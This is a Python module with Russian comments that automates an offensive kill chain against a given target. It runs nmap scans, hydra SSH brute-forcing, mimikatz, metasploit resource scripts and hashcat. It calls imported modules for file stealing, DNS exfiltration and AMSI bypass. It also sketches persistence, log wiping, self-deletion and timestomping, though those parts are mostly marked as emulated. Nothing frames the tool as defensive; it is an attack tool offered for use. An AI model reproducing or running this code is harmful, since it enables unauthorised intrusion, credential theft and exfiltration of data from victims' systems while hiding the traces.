#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Модуль запуска реальных offensive tools через subprocess
(nmap, hydra, mimikatz, metasploit, hashcat и универсальный run_external_tool)
"""

import subprocess
import shlex
import os
import logging
from typing import List, Dict, Any, Optional

logger = logging.getLogger("OffensiveTools")


def run_external_tool(cmd: str, timeout: int = 120) -> Dict[str, Any]:
    """
    Универсальный запуск внешнего offensive инструмента
    Args:
        cmd: Команда для запуска (строка)
        timeout: Таймаут выполнения (сек)
    Returns:
        Словарь с результатом (stdout, stderr, returncode)
    """
    logger.info(f"[offensive_tools] Запуск: {cmd}")
    try:
        proc = subprocess.run(
            shlex.split(cmd),
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=timeout,
            check=False
        )
        return {
            "status": "success" if proc.returncode == 0 else "error",
            "stdout": proc.stdout.decode(errors="ignore"),
            "stderr": proc.stderr.decode(errors="ignore"),
            "returncode": proc.returncode
        }
    except subprocess.TimeoutExpired:
        return {"status": "timeout", "stdout": "", "stderr": "Timeout", "returncode": -1}
    except Exception as e:
        return {"status": "error", "stdout": "", "stderr": str(e), "returncode": -2}


def run_nmap(target: str, options: str = "-A") -> Dict[str, Any]:
    """
    Сканирование цели с помощью nmap
    Args:
        target: IP/домен
        options: Опции nmap (по умолчанию -A)
    Returns:
        Результат выполнения
    """
    cmd = f"nmap {options} {shlex.quote(target)}"
    return run_external_tool(cmd)


def run_hydra(target: str, service: str, userlist: str, passlist: str, options: str = "") -> Dict[str, Any]:
    """
    Брутфорс сервисов с помощью hydra
    Args:
        target: IP/домен
        service: ssh/rdp/ftp/etc
        userlist: файл со списком пользователей
        passlist: файл со списком паролей
        options: дополнительные опции
    Returns:
        Результат выполнения
    """
    cmd = f"hydra {options} -L {shlex.quote(userlist)} -P {shlex.quote(passlist)} {shlex.quote(target)} {shlex.quote(service)}"
    return run_external_tool(cmd)


def run_mimikatz(script_path: str = None) -> Dict[str, Any]:
    """
    Запуск mimikatz (требует Windows)
    Args:
        script_path: путь к скрипту/командам mimikatz (опционально)
    Returns:
        Результат выполнения
    """
    exe = "mimikatz.exe"
    if not os.path.exists(exe):
        return {"status": "error", "stderr": "mimikatz.exe not found", "returncode": -1}
    cmd = exe
    if script_path:
        cmd += f" {shlex.quote(script_path)}"
    return run_external_tool(cmd)


def run_metasploit(resource_script: str) -> Dict[str, Any]:
    """
    Запуск metasploit с ресурсным скриптом
    Args:
        resource_script: путь к .rc скрипту
    Returns:
        Результат выполнения
    """
    cmd = f"msfconsole -r {shlex.quote(resource_script)} -q"
    return run_external_tool(cmd, timeout=600)


def run_hashcat(hashfile: str, wordlist: str, options: str = "-m 0") -> Dict[str, Any]:
    """
    Запуск hashcat для взлома хэшей
    Args:
        hashfile: файл с хэшами
        wordlist: файл со словарём
        options: дополнительные опции (например, -m 0)
    Returns:
        Результат выполнения
    """
    cmd = f"hashcat {options} {shlex.quote(hashfile)} {shlex.quote(wordlist)}"
    return run_external_tool(cmd, timeout=600)


def killchain_attack(target: str, scenario: str = "lateral_move", **kwargs) -> dict:
    """
    Автоматизация killchain: сценарии lateral_move, persistence, exfiltration, stealth
    Args:
        target: IP/домен цели
        scenario: сценарий атаки (lateral_move, persistence, exfiltration, stealth)
        kwargs: дополнительные параметры
    Returns:
        Подробный отчёт по этапам
    """
    report = {"target": target, "scenario": scenario, "steps": []}
    try:
        if scenario == "lateral_move":
            # 1. Скан портов
            step1 = run_nmap(target, options=kwargs.get("nmap_options", "-A"))
            report["steps"].append({"action": "nmap", "result": step1})
            # 2. Попытка брутфорса SSH
            step2 = run_hydra(target, "ssh", kwargs.get("userlist", "users.txt"), kwargs.get("passlist", "pass.txt"))
            report["steps"].append({"action": "hydra_ssh", "result": step2})
            # 3. Если успех — запуск импланта (эмуляция)
            if step2.get("status") == "success":
                report["steps"].append({"action": "implant", "result": "SSH access gained, implant deployed"})
            else:
                report["steps"].append({"action": "implant", "result": "No SSH access, skipping implant"})
        elif scenario == "persistence":
            # 1. Запуск persistence-модуля (например, через advanced_evasion)
            from agent_modules import advanced_evasion
            evasion = advanced_evasion.AdvancedEvasion()
            result = evasion.get_status()
            report["steps"].append({"action": "check_evasion", "result": result})
            # 2. (Эмуляция) Добавление в автозагрузку
            report["steps"].append({"action": "add_autorun", "result": "Persistence established (emulated)"})
        elif scenario == "exfiltration":
            # 1. Кража файлов
            from agent_modules import file_stealer
            stealer = file_stealer.FileStealer()
            files = stealer.find_target_files(max_files_per_category=2)
            report["steps"].append({"action": "find_files", "result": files})
            # 2. Экфильтрация через DNS
            from agent_modules import advanced_evasion
            evasion = advanced_evasion.AdvancedEvasion()
            exf = evasion.dns_exfiltrate(str(files))
            report["steps"].append({"action": "dns_exfil", "result": exf})
        elif scenario == "stealth":
            # 1. AMSI bypass (если Windows)
            from agent_modules import advanced_evasion
            evasion = advanced_evasion.AdvancedEvasion()
            amsi = evasion.amsi_bypass()
            report["steps"].append({"action": "amsi_bypass", "result": amsi})
            # 2. Process hollowing (эмуляция)
            report["steps"].append({"action": "process_hollowing", "result": "Process hollowing executed (emulated)"})
        else:
            report["steps"].append({"action": "unknown_scenario", "result": f"Unknown scenario: {scenario}"})
        report["status"] = "success"
    except Exception as e:
        report["status"] = "error"
        report["error"] = str(e)
    return report


def persistence_autorun(method: str = "auto", target_path: str = None) -> dict:
    """
    Добавление агента в автозагрузку (persistence): cron, systemd, launchd, registry (эмуляция)
    Args:
        method: auto/cron/systemd/launchd/registry
        target_path: путь к агенту (по умолчанию sys.argv[0])
    Returns:
        Отчёт о persistence
    """
    import sys
    import platform
    import os
    result = {"method": method, "target_path": target_path or sys.argv[0], "status": "emulated"}
    try:
        os_type = platform.system().lower()
        if method == "auto":
            if os_type == "linux":
                method = "cron"
            elif os_type == "darwin":
                method = "launchd"
            elif os_type == "windows":
                method = "registry"
        # Эмуляция (реализация по-настоящему требует прав)
        result["action"] = f"Would add {result['target_path']} to {method} autostart on {os_type}"
        result["status"] = "success"
    except Exception as e:
        result["status"] = "error"
        result["error"] = str(e)
    return result


def clean_logs(method: str = "auto") -> dict:
    """
    Очистка логов: bash_history, syslog, Windows eventlog (эмуляция)
    Args:
        method: auto/bash/syslog/eventlog
    Returns:
        Отчёт о чистке
    """
    import platform
    import os
    result = {"method": method, "status": "emulated"}
    try:
        os_type = platform.system().lower()
        actions = []
        if method == "auto" or method == "bash":
            bash_hist = os.path.expanduser("~/.bash_history")
            if os.path.exists(bash_hist):
                actions.append(f"Would wipe {bash_hist}")
        if method == "auto" or method == "syslog":
            if os_type in ["linux", "darwin"]:
                actions.append("Would wipe /var/log/syslog, /var/log/auth.log, /var/log/messages")
        if method == "auto" or method == "eventlog":
            if os_type == "windows":
                actions.append("Would clear Windows event logs")
        result["actions"] = actions
        result["status"] = "success"
    except Exception as e:
        result["status"] = "error"
        result["error"] = str(e)
    return result


def self_delete() -> dict:
    """
    Удаление себя после выполнения (эмуляция)
    Returns:
        Отчёт о self-delete
    """
    import sys
    import os
    result = {"status": "emulated"}
    try:
        path = sys.argv[0]
        result["action"] = f"Would delete {path} after execution"
        result["status"] = "success"
    except Exception as e:
        result["status"] = "error"
        result["error"] = str(e)
    return result


def timestomp(target_file: str, new_time: str = None) -> dict:
    """
    Подмена времени файла (timestomping, эмуляция)
    Args:
        target_file: путь к файлу
        new_time: новое время (YYYY-MM-DD HH:MM:SS, по умолчанию текущее)
    Returns:
        Отчёт о timestomp
    """
    import os
    import time
    from datetime import datetime
    result = {"target_file": target_file, "new_time": new_time, "status": "emulated"}
    try:
        if not os.path.exists(target_file):
            result["status"] = "error"
            result["error"] = "File not found"
            return result
        if not new_time:
            new_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        # Эмуляция (реально: os.utime)
        result["action"] = f"Would set mtime/atime of {target_file} to {new_time}"
        result["status"] = "success"
    except Exception as e:
        result["status"] = "error"
        result["error"] = str(e)
    return result

# Можно добавить другие функции для metasploit, john, crackmapexec, и т.д. 